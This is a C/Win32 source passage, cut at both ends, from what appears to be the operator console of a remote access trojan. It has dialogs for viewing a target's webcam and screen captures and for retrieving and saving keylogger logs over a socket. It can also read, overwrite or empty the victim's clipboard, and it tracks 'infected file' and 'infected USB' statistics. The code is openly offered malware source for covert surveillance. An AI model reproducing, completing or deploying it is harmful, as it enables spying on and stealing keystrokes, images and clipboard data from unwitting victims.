    return TRUE;

    case WM_CLOSE:
    {
        EndDialog(hwndwDlg,0);
        //DeleteObject(g_hbmBall);
    }
    return TRUE;

    case WM_PAINT:
    {

        Final = LoadJPEG(CamRDir);
        GetClientRect(hwndwDlg, (LPRECT) &rc);
        if(Final == NULL) return -1;
        hdcScreen = GetDC(HWND_DESKTOP);
        hdcBackground = CreateCompatibleDC(hdcScreen);
        ndcBackground = SaveDC(hdcBackground);
        SelectObject(hdcBackground, Final);
        ReleaseDC(HWND_DESKTOP, hdcScreen);
        if(BeginPaint(hwndwDlg, &ps))
        {
            /////////////////////////Screen1
            // Create int buffer
            hdcMem = CreateCompatibleDC(ps.hdc);
            ndcMem = SaveDC(hdcMem);
            hbmMem = CreateCompatibleBitmap(ps.hdc, rc.right - 0, rc.bottom - 0);
            SelectObject(hdcMem, hbmMem);

            // Copy background bitmap into int buffer
            if(BitBlt(hdcMem, 0, 0, rc.right - 0, rc.bottom - 0, hdcBackground, 0, 0, SRCCOPY) == NULL)
            {
                //MessageBox(NULL, "failed", "FAILED", MB_OK);
            }
            //StretchBlt(ps.hdc, 0, 0, rc.right, rc.bottom - 10, hdcMem,  0, 0,  ID3, ID4, SRCCOPY);
            //Copy int buffer to screen
            if(BitBlt(ps.hdc, 0, 0, rc.right - 0, rc.bottom - 0, hdcMem, 0, 0, SRCCOPY) == NULL)
            {
                //	MessageBox(NULL, "failed Screen", "FAILED", MB_OK);
            }

            // Clean up
            RestoreDC(hdcMem, ndcMem);
            DeleteObject(hbmMem);
            DeleteObject(Final);
            DeleteDC(hdcMem);
            DeleteDC(hdcScreen);
            DeleteDC(hdc);
            EndPaint(hwndwDlg, &ps);
        }







        // HANDLE_WM_PAINT(hwndsDlg,wParam,lParam,OnPaint);
        /*BITMAP bm;
        PAINTSTRUCT ps;

        HDC hdc = BeginPaint(hwndsDlg, &ps);

        HDC hdcMem = CreateCompatibleDC(hdc);
        HBITMAP hbmOld = (HBITMAP)SelectObject(hdcMem,g_hbmScrSht);

        GetObject(g_hbmScrSht, sizeof(bm), &bm);

        BitBlt(hdc, 0, 0, bm.bmWidth, bm.bmHeight, hdcMem, 0, 0, SRCCOPY);

        SelectObject(hdcMem, hbmOld);

        /RestoreDC(hdcMem);
        DeleteDC(hdc);
        DeleteObject(g_hbmScrSht);
        DeleteObject(hbmOld);

        EndPaint(hwndsDlg, &ps);*/



    }
    return TRUE;
    }
    return FALSE;
}


DWORD WINAPI WebShotWindow(LPVOID lpParam)
{
    hwndwebsht = CreateDialog(wInst,(LPCTSTR)WEB_SHOT_Dlg,NULL,(DLGPROC)WEBSHT_DlgProc);
    ShowWindow(hwndwebsht,SW_SHOW);

    SendMessage(hwndwebsht, WM_SETICON, ICON_SMALL, (LPARAM)LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON)));
    SendMessage(hwndwebsht, WM_SETICON, ICON_BIG, (LPARAM)LoadIcon(NULL, MAKEINTRESOURCE(IDI_ICON)));


    MSG msg;
    while(GetMessage(&msg,hwndwebsht,0,0)==TRUE)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return 0;

}







BOOL CALLBACK SCRSHT_DlgProc(HWND hwndsDlg, UINT uMsg, WPARAM wParam, LPARAM lParam)
{


    RECT rc;    // client area
    HBITMAP Final;
    HDC hdcBackground;
    INT ndcBackground;
    HDC hdc = 0;
    HDC hdcScreen;

    POINT pt;
    RECT  rect,rect2;
    HICON hAicon;

    PAINTSTRUCT ps;
    HBITMAP hbmMem;
    INT ndcMem;
    HDC hdcMem;
    BITMAP bm;

    switch(uMsg)
    {

    case WM_INITDIALOG:
    {
        /*   hStatus5 = CreateWindowEx(0, STATUSCLASSNAME,
                                 NULL, WS_CHILD | WS_VISIBLE |
                                SBARS_SIZEGRIP, 0,0,0,0,hwndsDlg,
                                (HMENU) IDC_SCRSHT_STATUS,
                                 GetModuleHandle(NULL), NULL);*/
//g_hbmBall = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_BALL));

        DestroyCaption(hwndsDlg);

        hAicon = (HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_SAVE2), IMAGE_ICON, 16, 16, 0);
        SendMessage(GetDlgItem(hwndsDlg, IDC_SAVE_SCR), STM_SETICON, (WPARAM)hAicon, (LPARAM)0);

        hAicon = (HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_CANCELABT), IMAGE_ICON, 16, 16, 0);
	    	SendMessage(GetDlgItem(hwndsDlg, IDC_EXT_SCR), STM_SETICON, (WPARAM)hAicon, (LPARAM)0);

        SendMessage(GetDlgItem(hwndsDlg,IDC_PROGRESS), PBM_SETPOS , (WPARAM)5, 0);

    }
    return TRUE;

    case WM_LBUTTONDOWN:
      {
		    GetCursorPos(&pt);
        GetWindowRect(GetDlgItem(hwndsDlg, IDC_SAVE_SCR), &rect);
		    GetWindowRect(GetDlgItem(hwndsDlg, IDC_EXT_SCR), &rect2);

	     	if(PtInRect(&rect, pt))
		   {


		    break;
		   }


	     	if(PtInRect(&rect2, pt))
		   {
		    EndDialog(hwndsDlg,0);
		    break;
		   }


		   else
		   {
		    SendMessage(hwndsDlg,WM_NCLBUTTONDOWN,HTCAPTION,0);
		   }

    }
    return TRUE;




case WM_MOUSEMOVE:
    {
        GetCursorPos(&pt);
        GetWindowRect(GetDlgItem(hwndsDlg, IDC_SAVE_SCR), &rect);
		    GetWindowRect(GetDlgItem(hwndsDlg, IDC_EXT_SCR), &rect2);


		if(PtInRect(&rect, pt))
		{
		  	SetCursor(LoadCursor(NULL, MAKEINTRESOURCE(32649)));

        hAicon = (HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_SAVE2), IMAGE_ICON, 17, 17, 0);
		    SendMessage(GetDlgItem(hwndsDlg, IDC_SAVE_SCR), STM_SETICON, (WPARAM)hAicon, (LPARAM)0);

		    break;

		}


		if(PtInRect(&rect2, pt))
		{
		  	SetCursor(LoadCursor(NULL, MAKEINTRESOURCE(32649)));

        hAicon = (HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_CANCELABT), IMAGE_ICON, 17, 17, 0);
		    SendMessage(GetDlgItem(hwndsDlg, IDC_EXT_SCR), STM_SETICON, (WPARAM)hAicon, (LPARAM)0);

		    break;

		}

		else
		{
      hAicon = (HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_SAVE2), IMAGE_ICON, 16, 16, 0);
      SendMessage(GetDlgItem(hwndsDlg, IDC_SAVE_SCR), STM_SETICON, (WPARAM)hAicon, (LPARAM)0);

      hAicon = (HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_CANCELABT), IMAGE_ICON, 16, 16, 0);
	  	SendMessage(GetDlgItem(hwndsDlg, IDC_EXT_SCR), STM_SETICON, (WPARAM)hAicon, (LPARAM)0);
		}

    }
    return TRUE;





    case WM_COMMAND:
    {

    }
    return TRUE;

    case WM_CLOSE:
    {
        EndDialog(hwndsDlg,0);
        //DeleteObject(g_hbmBall);
    }
    return TRUE;

    case WM_PAINT:
    {

        Final = LoadJPEG(ScrRDir);
        GetClientRect(hwndsDlg, (LPRECT) &rc);
        if(Final == NULL) return -1;
        hdcScreen = GetDC(HWND_DESKTOP);
        hdcBackground = CreateCompatibleDC(hdcScreen);
        ndcBackground = SaveDC(hdcBackground);
        SelectObject(hdcBackground, Final);
        ReleaseDC(HWND_DESKTOP, hdcScreen);
        if(BeginPaint(hwndsDlg, &ps))
        {
            /////////////////////////Screen1
            // Create int buffer
            hdcMem = CreateCompatibleDC(ps.hdc);
            ndcMem = SaveDC(hdcMem);
            hbmMem = CreateCompatibleBitmap(ps.hdc, rc.right - 0, rc.bottom - 0);
            SelectObject(hdcMem, hbmMem);

            // Copy background bitmap into int buffer
            if(BitBlt(hdcMem, 0, 0,rc.right - 0, rc.bottom - 0, hdcBackground, 0, 0, SRCCOPY) == NULL)
            {
                //MessageBox(NULL, "failed", "FAILED", MB_OK);
            }
            //StretchBlt(ps.hdc, 0, 0, rc.right, rc.bottom - 10, hdcMem,  0, 0, SRCCOPY);
            //Copy int buffer to screen
            if(BitBlt(ps.hdc, 0, 0,rc.right - 0,rc.bottom - 0, hdcMem, 0, 0, SRCCOPY) == NULL)
            {
                //	MessageBox(NULL, "failed Screen", "FAILED", MB_OK);
            }

            // Clean up
            RestoreDC(hdcMem, ndcMem);
            DeleteObject(hbmMem);
            DeleteObject(Final);
            DeleteDC(hdcMem);
            DeleteDC(hdcScreen);
            DeleteDC(hdc);
            EndPaint(hwndsDlg, &ps);
        }







        // HANDLE_WM_PAINT(hwndsDlg,wParam,lParam,OnPaint);
        /*BITMAP bm;
        PAINTSTRUCT ps;

        HDC hdc = BeginPaint(hwndsDlg, &ps);

        HDC hdcMem = CreateCompatibleDC(hdc);
        HBITMAP hbmOld = (HBITMAP)SelectObject(hdcMem,g_hbmScrSht);

        GetObject(g_hbmScrSht, sizeof(bm), &bm);

        BitBlt(hdc, 0, 0, bm.bmWidth, bm.bmHeight, hdcMem, 0, 0, SRCCOPY);

        SelectObject(hdcMem, hbmOld);

        /RestoreDC(hdcMem);
        DeleteDC(hdc);
        DeleteObject(g_hbmScrSht);
        DeleteObject(hbmOld);

        EndPaint(hwndsDlg, &ps);*/



    }
    return TRUE;
    }
    return FALSE;
}


DWORD WINAPI ScrShotWindow(LPVOID lpParam)
{
    hwndScrSht = CreateDialog(sInst,(LPCTSTR)SCR_SHOT_Dlg,NULL,(DLGPROC)SCRSHT_DlgProc);
    ShowWindow(hwndScrSht,SW_SHOW);

    SendMessage(hwndScrSht, WM_SETICON, ICON_SMALL, (LPARAM)LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON)));
    SendMessage(hwndScrSht, WM_SETICON, ICON_BIG, (LPARAM)LoadIcon(NULL, MAKEINTRESOURCE(IDI_ICON)));


    MSG msg;
    while(GetMessage(&msg,hwndScrSht,0,0)==TRUE)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return 0;

}




BOOL CALLBACK Keylog_DlgProc(HWND hwndkDlg, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
    CHOOSECOLOR cc;
    CHARFORMAT cf;
    DWORD dwColors[ 16 ];

    switch(uMsg)
    {
    case WM_INITDIALOG:
    {
        HWND button1 =  GetDlgItem(hwndkDlg,IDC_RTRV_BUT);
        HANDLE hIBitMap = LoadImage(GetModuleHandle(NULL),MAKEINTRESOURCE(IDB_REFRESH),IMAGE_BITMAP,14,12,LR_DEFAULTCOLOR);
        SendMessage(button1,BM_SETIMAGE,IMAGE_BITMAP,(LPARAM)hIBitMap);

        HWND button2 =  GetDlgItem(hwndkDlg,IDC_SAVE_LOGS);
        HANDLE hIBitMap2 = LoadImage(GetModuleHandle(NULL),MAKEINTRESOURCE(IDB_SAVE),IMAGE_BITMAP,14,12,LR_DEFAULTCOLOR);
        SendMessage(button2,BM_SETIMAGE,IMAGE_BITMAP,(LPARAM)hIBitMap2);

        hStatus4 = CreateWindowEx(0, STATUSCLASSNAME,
                                  NULL, WS_CHILD | WS_VISIBLE |
                                  SBARS_SIZEGRIP, 0,0,0,0,hwndkDlg,
                                  (HMENU) IDC_TASK_STATUS,
                                  GetModuleHandle(NULL), NULL);


        if(GetDlgItem( hwndkDlg, IDC_DISP_LOG ))                         //  Sanity Check
        {
            memset( &cf, 0, sizeof(CHARFORMAT) );      //  Initialize structure

            cf.cbSize = sizeof(CHARFORMAT);             //  Initialize RichEdit
            cf.dwMask = CFM_COLOR | CFM_FACE | CFM_SIZE;  //  control structure
            cf.crTextColor = dwTextColor;
            cf.yHeight = 32;
            strcpy( cf.szFaceName, "MS Sans Serif" );
            //  Set character formatting and background color
            SendDlgItemMessage( hwndkDlg, IDC_DISP_LOG, EM_SETCHARFORMAT, 4, (LPARAM)&cf );
            //SendDlgItemMessage( hwndkDlg, IDC_DISP_LOG, EM_SETBKGNDCOLOR, dwBackColor, 0 );
        }


    }
    return TRUE;

    /*case WM_CTLCOLORDLG:
    return (LONG)g_hbrBackground;*/



    case WM_COMMAND:
    {
        switch(LOWORD(wParam))
        {
        case IDC_RTRV_BUT:
        {
            SEND.PacketType = SEND_LOGS;
            SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
            SendDataKB+=SSizeKB;
            SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
            UpdateStats();
        }
        break;

        case IDC_SAVE_LOGS:
        {
          LogSize = GetWindowTextLength (GetDlgItem(hwndkDlg, IDC_DISP_LOG));
          SaveLogs = (char *)GlobalAlloc(GPTR, LogSize + 1);
          GetWindowText(GetDlgItem(hwndkDlg, IDC_DISP_LOG), SaveLogs, LogSize);

	OPENFILENAME ofn;
	char szLogFileName[MAX_PATH] = "";

	ZeroMemory(&ofn, sizeof(ofn));

	ofn.lStructSize = sizeof(OPENFILENAME);
	ofn.hwndOwner = hwndkDlg;
	ofn.lpstrFilter = "Text Files (*.txt)\0*.txt\0All Files (*.*)\0*.*\0";
	ofn.lpstrFile = szLogFileName;
	ofn.nMaxFile = MAX_PATH;
	ofn.lpstrDefExt = "txt";
	ofn.Flags = OFN_EXPLORER | OFN_PATHMUSTEXIST | OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT;

	if(GetSaveFileName(&ofn))
	{
			LogFileHandle = CreateFile (szLogFileName, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
			WriteFile(LogFileHandle, SaveLogs, strlen(SaveLogs), &numb_bytes, NULL);
	}

        }
        break;

        }

    }
    return TRUE;

    /* case WM_PAINT:
     {

     }
     return TRUE;*/

    case WM_CLOSE:
    {
        EndDialog(hwndkDlg,0);
    }
    return TRUE;

    case WM_CTLCOLORSTATIC:
    {
        HDC hdcStatic = (HDC)wParam;
        SetTextColor(hdcStatic, RGB(255, 255, 255));
        SetBkMode(hdcStatic, TRANSPARENT);
        return (LONG)g_hbrBackground;
    }
    break;

    }
    return FALSE;
}


DWORD WINAPI KeyLogWindow(LPVOID lpParam)
{
    hwndKeylog = CreateDialog(kInst,(LPCTSTR)/*IDD_KEYLOG*/Keylog_Dlg,NULL,(DLGPROC)Keylog_DlgProc);
    ShowWindow(hwndKeylog,SW_SHOW);

    SendMessage(hwndKeylog, WM_SETICON, ICON_SMALL, (LPARAM)LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON)));
    SendMessage(hwndKeylog, WM_SETICON, ICON_BIG, (LPARAM)LoadIcon(NULL, MAKEINTRESOURCE(IDI_ICON)));


    MSG msg;
    while(GetMessage(&msg,hwndKeylog,0,0)==TRUE)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return 0;

}



int SetClipboard(char *PasteClip)
{

  const size_t len = strlen(PasteClip)+1;
  HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE|GMEM_DDESHARE ,len);

  memcpy(GlobalLock(hMem),PasteClip,len);
  GlobalUnlock(hMem);

  if(OpenClipboard(NULL))
     EmptyClipboard();
     SetClipboardData(CF_TEXT,hMem);
  CloseClipboard();

  return 0;
}




int GetClipboard()
{
HANDLE Clip;
char *show;
string cliptext;
int i;

  if(OpenClipboard(NULL))
     Clip = GetClipboardData(CF_TEXT);
  CloseClipboard();

  while(((char*)Clip)[i] != 0)
  {
      cliptext += ((char*)Clip)[i];
      i++;
  }

  show = (char*)malloc(cliptext.size()+1);
  memcpy(show,cliptext.c_str(),cliptext.size()+1);

  lstrcpy(SEND.cliptext,show);


  free(show);
  return 0;

}




BOOL CALLBACK WriteCBoard_DlgProc(HWND hwndWCBdlg, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch(message)
    {
    case WM_INITDIALOG:
    {

    }
    break;

    case WM_COMMAND:
    {
        switch(LOWORD(wParam))
        {

           case IDC_PASTE_CBBTN:
           {

                   GetWindowText(GetDlgItem(hwndWCBdlg, IDC_PASTE_CBEDT), SEND.cliptext, sizeof(SEND.cliptext));

                   SEND.PacketType = PASTE_CLIP_BOARD;
                   SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
                   SendDataKB+=SSizeKB;
                   SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
                   UpdateStats();

                   EndDialog(hwndWCBdlg,0);

           }


        }
    }
    return TRUE;

    case WM_CLOSE:
    {
        EndDialog(hwndWCBdlg,0);
    }
    break;


    }
    return FALSE;
}







BOOL CALLBACK ClipBoard_DlgProc(HWND hwndCBdlg, UINT message, WPARAM wParam, LPARAM lParam)
{

    RECT rc;    // client area
    POINT  pt;   // location of mouse click
    HMENU hmenu;

    switch(message)
    {
    case WM_INITDIALOG:
    {


        hStatus10 = CreateWindowEx(0, STATUSCLASSNAME,
                                  NULL, WS_CHILD | WS_VISIBLE |
                                  SBARS_SIZEGRIP, 0,0,0,0,hwndCBdlg,
                                  (HMENU) IDC_FILE_STATUS,
                                  GetModuleHandle(NULL), NULL);

        hList12=GetDlgItem(hwndCBdlg,IDC_LIST12);

        memset(&LvCol2,0,sizeof(LvCol2));                  // Zero Members
        LvCol2.cx=0;                                   // width between each coloum
// Inserting Couloms as much as we want

        ListView_SetExtendedListViewStyle(hList12, exStyles);

        LvCol2.mask=LVCF_TEXT|LVCF_WIDTH/*|LVCF_IMAGE*/;    // Type of mask
        LvCol2.cx=135;                                   // width of column
        LvCol2.pszText="Refreshed";                            // First Header Text
        SendMessage(hList12,LVM_INSERTCOLUMN,0,(LPARAM)&LvCol2); // Insert/Show the coloum
        LvCol2.cx=345;                                   // width of column
        LvCol2.pszText="Preview Content";                            // Next coloum
        SendMessage(hList12,LVM_INSERTCOLUMN,1,(LPARAM)&LvCol2); // ...


        LvItem2.mask=LVIF_TEXT|LVIF_IMAGE;   // Text Style
        LvItem2.cchTextMax = 256; // Max size of test
        LvItem2.iItem=0;          // choose item
        LvItem2.iSubItem=0;       // Put in first coluom


    }
    break;


    case WM_COMMAND:
    {
        switch(LOWORD(wParam))
        {

            case IDC_REF_CBOARD:
            {

                   //SendMessage(hList12,LVM_DELETEALLITEMS,0,0);
                   SEND.PacketType = REQ_CLIP_BOARD;
                   SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
                   SendDataKB+=SSizeKB;
                   SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
                   UpdateStats();
            }
            break;


            case IDC_COPY_CBOARD:
            {

                   SEND.PacketType = COPY_CLIP_BOARD;
                   SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
                   SendDataKB+=SSizeKB;
                   SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
                   UpdateStats();
            }
            break;


            case IDC_PASTE_CBOARD:
            {

                   GetClipboard();

                   SEND.PacketType = PASTE_CLIP_BOARD;
                   SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
                   SendDataKB+=SSizeKB;
                   SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
                   UpdateStats();

            }
            break;

            case IDC_WRITE_CBOARD:
            {

                  DialogBox(GInstance,(LPCTSTR)WRITE_CBOARD_DLG,hwndCBdlg,(DLGPROC)WriteCBoard_DlgProc);

            }
            break;


            case IDC_EMPTY_CBOARD:
            {

                   SEND.PacketType = EMPTY_CLIP_BOARD;
                   SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
                   SendDataKB+=SSizeKB;
                   SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
                   UpdateStats();
            }
            break;


        }
    }
    return TRUE;

    case WM_NOTIFY:
    {
        switch(LOWORD(wParam))
        {
        case IDC_LIST12:
        {
            if(((LPNMHDR)lParam)->code == NM_RCLICK)
            {
            int iSlected=0;

            iSlected=SendMessage(hList12,LVM_GETNEXTITEM,-1,LVNI_SELECTED);

            HBITMAP hTMBitMap = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_REF_CBOARD));
            HBITMAP hTMBitMap1 = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_DLT_CBOARD));
            HBITMAP hTMBitMap2 = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_CPY_CBOARD));
            HBITMAP hTMBitMap3 = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_PST_CBOARD));
            HBITMAP hTMBitMap4 = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_WRT_CBOARD));




                if(iSlected==-1)
                {

                    //break;
                }

                    flag=1;

                    GetClientRect(hwndCBdlg, (LPRECT) &rc);

                    // Get the client coordinates for the mouse click.
                    GetCursorPos(&pt);
                    pt.y += 15;
                    pt.x += 15;

                    hmenu = CreatePopupMenu();
                    AppendMenu(hmenu, MF_STRING|MF_POPUP,IDC_REF_CBOARD,"Refresh");
                    SetMenuItemBitmaps(hmenu,IDC_REF_CBOARD,MF_BITMAP,hTMBitMap,hTMBitMap);
                    AppendMenu(hmenu, MF_STRING|MF_POPUP,IDC_COPY_CBOARD,"Copy remote clipboard onto your clipboard ");
                    SetMenuItemBitmaps(hmenu,IDC_COPY_CBOARD,MF_BITMAP,hTMBitMap2,hTMBitMap2);
                    AppendMenu(hmenu, MF_STRING|MF_POPUP,IDC_PASTE_CBOARD,"Paste your clipboard onto remote clipboard ");
                    SetMenuItemBitmaps(hmenu,IDC_PASTE_CBOARD,MF_BITMAP,hTMBitMap3,hTMBitMap3);
                    AppendMenu(hmenu, MF_STRING|MF_POPUP,IDC_WRITE_CBOARD,"Write on remote clipboard ");
                    SetMenuItemBitmaps(hmenu,IDC_WRITE_CBOARD,MF_BITMAP,hTMBitMap4,hTMBitMap4);
                    AppendMenu(hmenu, MF_STRING|MF_POPUP,IDC_EMPTY_CBOARD,"Empty remote clipboard ");
                    SetMenuItemBitmaps(hmenu,IDC_EMPTY_CBOARD,MF_BITMAP,hTMBitMap1,hTMBitMap1);

                    TrackPopupMenu(hmenu/*TrackPopup*/, TPM_LEFTALIGN | TPM_LEFTBUTTON, pt.y, pt.y, 0, hwndCBdlg, NULL);


            }

        }
        }
    }
    return TRUE;


    case WM_CLOSE:
    {
        EndDialog(hwndCBdlg,0);
    }
    break;


    }
    return FALSE;
}


DWORD WINAPI ClipBoardWindow(LPVOID lpParam)
{
    hwndCBoard = CreateDialog(CBInst,(LPCTSTR)CLIP_BOARD_DLG,NULL,(DLGPROC)ClipBoard_DlgProc);
    ShowWindow(hwndCBoard,SW_SHOW);

    SendMessage(hwndCBoard, WM_SETICON, ICON_SMALL, (LPARAM)LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON)));
    SendMessage(hwndCBoard, WM_SETICON, ICON_BIG, (LPARAM)LoadIcon(NULL, MAKEINTRESOURCE(IDI_ICON)));


    MSG msg;
    while(GetMessage(&msg,hwndCBoard,0,0)==TRUE)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return 0;

}








VOID EnableStatControls(HWND hWnd, BOOL bEnable)
{
    EnableWindow(GetDlgItem(hWnd, IDC_CANCEL_DLOAD), bEnable);
    EnableWindow(GetDlgItem(hWnd, IDC_PAUSE_DLOAD), bEnable);
    EnableWindow(GetDlgItem(hWnd, IDC_RESUME_DLOAD), bEnable);
}





BOOL CALLBACK Statistics_DlgProc(HWND hwndSTdlg, UINT message, WPARAM wParam, LPARAM lParam)
{

    POINT pt;
    RECT  rect,rect2,rect3;


    switch(message)
    {


        case WM_LBUTTONDOWN:
           {
		    GetCursorPos(&pt);
		    GetWindowRect(GetDlgItem(hwndSTdlg, IDC_EXT_STAT), &rect);

	     	if(PtInRect(&rect, pt))
		   {
		    EndDialog(hwndSTdlg,0);
		   }

		   else
		   {
		    SendMessage(hwndSTdlg,WM_NCLBUTTONDOWN,HTCAPTION,0);
		   }


           break;
           }



    case WM_INITDIALOG:
    {

        DestroyCaption(hwndSTdlg);

        HICON hAIcon;

        hAIcon = (HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_CANCELABT), IMAGE_ICON, 16, 16, 0);
		SendMessage(GetDlgItem(hwndSTdlg, IDC_EXT_STAT), STM_SETICON, (WPARAM)hAIcon, (LPARAM)0);
    }
    break;


	case WM_MOUSEMOVE:
    {
        GetCursorPos(&pt);
		    GetWindowRect(GetDlgItem(hwndSTdlg, IDC_EXT_STAT), &rect);
        //GetWindowRect(GetDlgItem(hwndSTdlg, IDC_EXT_STAT), &rect2);
        HICON hAIcon;
        //GetWindowRect(GetDlgItem(hwndEDlg, IDC_SOCKINFO), &rect3);

		if(PtInRect(&rect, pt)/*||PtInRect(&rect2, pt)*//*||PtInRect(&rect3, pt)*/)
		{
		  	SetCursor(LoadCursor(NULL, MAKEINTRESOURCE(32649)));

        hAIcon = (HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_CANCELABT), IMAGE_ICON, 17, 17, 0);
		    SendMessage(GetDlgItem(hwndSTdlg, IDC_EXT_STAT), STM_SETICON, (WPARAM)hAIcon, (LPARAM)0);

		}

		else
		{
        hAIcon = (HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_CANCELABT), IMAGE_ICON, 16, 16, 0);
		SendMessage(GetDlgItem(hwndSTdlg, IDC_EXT_STAT), STM_SETICON, (WPARAM)hAIcon, (LPARAM)0);
		}
    }
    break;


    case WM_COMMAND:
    {
        switch(LOWORD(wParam))
        {
          case IDC_REST_ALLSTATS:
          {
            CleanStatsDB();
            //MessageBox(hwndStat,"Reset Complete","Done",MB_OK|MB_ICONINFORMATION);
            //UpdateStats();
          }
          break;
        }
    }
    break;



    case WM_PAINT:
    {
        BITMAP bm;
        PAINTSTRUCT ps;


        HBITMAP hbmSIco = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_DLSTAT));
        HBITMAP hbmSIco2 = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_ULSTAT));
        HBITMAP hbmSIco3 = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_ULFILESTAT));
        HBITMAP hbmSIco4 = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_DLFILESTAT));
        HBITMAP hbmSIco5 = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_CONN));
        HBITMAP hbmSIco6 = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_INFFILE));
        HBITMAP hbmSIco7 = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_INFUSB));

        HDC hdc = BeginPaint(hwndSTdlg, &ps);

        HDC hdcMem = CreateCompatibleDC(hdc);
        HDC hdcMem2 = CreateCompatibleDC(hdc);
        HDC hdcMem3 = CreateCompatibleDC(hdc);
        HDC hdcMem4 = CreateCompatibleDC(hdc);
        HDC hdcMem5 = CreateCompatibleDC(hdc);
        HDC hdcMem6 = CreateCompatibleDC(hdc);
        HDC hdcMem7 = CreateCompatibleDC(hdc);

        HBITMAP hbmOld = (HBITMAP)SelectObject(hdcMem,hbmSIco);
        HBITMAP hbmOld2 = (HBITMAP)SelectObject(hdcMem2,hbmSIco2);
        HBITMAP hbmOld3 = (HBITMAP)SelectObject(hdcMem3,hbmSIco3);
        HBITMAP hbmOld4 = (HBITMAP)SelectObject(hdcMem4,hbmSIco4);
        HBITMAP hbmOld5 = (HBITMAP)SelectObject(hdcMem5,hbmSIco5);
        HBITMAP hbmOld6 = (HBITMAP)SelectObject(hdcMem6,hbmSIco6);
        HBITMAP hbmOld7 = (HBITMAP)SelectObject(hdcMem7,hbmSIco7);


        GetObject(hbmSIco, sizeof(bm), &bm);
        GetObject(hbmSIco2, sizeof(bm), &bm);
        GetObject(hbmSIco3, sizeof(bm), &bm);
        GetObject(hbmSIco4, sizeof(bm), &bm);
        GetObject(hbmSIco5, sizeof(bm), &bm);
        GetObject(hbmSIco6, sizeof(bm), &bm);
        GetObject(hbmSIco7, sizeof(bm), &bm);

        BitBlt(hdc, 10, 75, bm.bmWidth, bm.bmHeight, hdcMem, 0, 0, SRCCOPY);
        BitBlt(hdc, 10, 20, bm.bmWidth, bm.bmHeight, hdcMem2, 0, 0, SRCCOPY);
        BitBlt(hdc, 220, 20, bm.bmWidth, bm.bmHeight, hdcMem3, 0, 0, SRCCOPY);
        BitBlt(hdc, 220, 75, bm.bmWidth, bm.bmHeight, hdcMem4, 0, 0, SRCCOPY);
        BitBlt(hdc, 9, 130, bm.bmWidth, bm.bmHeight, hdcMem5, 0, 0, SRCCOPY);
        BitBlt(hdc, 220, 159, bm.bmWidth, bm.bmHeight, hdcMem6, 0, 0, SRCCOPY);
        BitBlt(hdc, 220, 130, bm.bmWidth, bm.bmHeight, hdcMem7, 0, 0, SRCCOPY);

        SelectObject(hdcMem, hbmOld);
        SelectObject(hdcMem2, hbmOld2);
        SelectObject(hdcMem3, hbmOld3);
        SelectObject(hdcMem4, hbmOld4);
        SelectObject(hdcMem5, hbmOld5);
        SelectObject(hdcMem6, hbmOld6);
        SelectObject(hdcMem7, hbmOld7);


        RestoreDC(hdcMem,0);
        DeleteDC(hdc);
        DeleteObject(hbmSIco);
        DeleteObject(hbmOld);

     /*   //EndPaint(hwndSTdlg, &ps);
        HBITMAP hbmSIco2 = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_ULSTAT));

        //HDC hdc2 = BeginPaint(hwndSTdlg, &ps);

        HDC hdcMem2 = CreateCompatibleDC(hdc);
        HBITMAP hbmOld2 = (HBITMAP)SelectObject(hdcMem2,hbmSIco2);

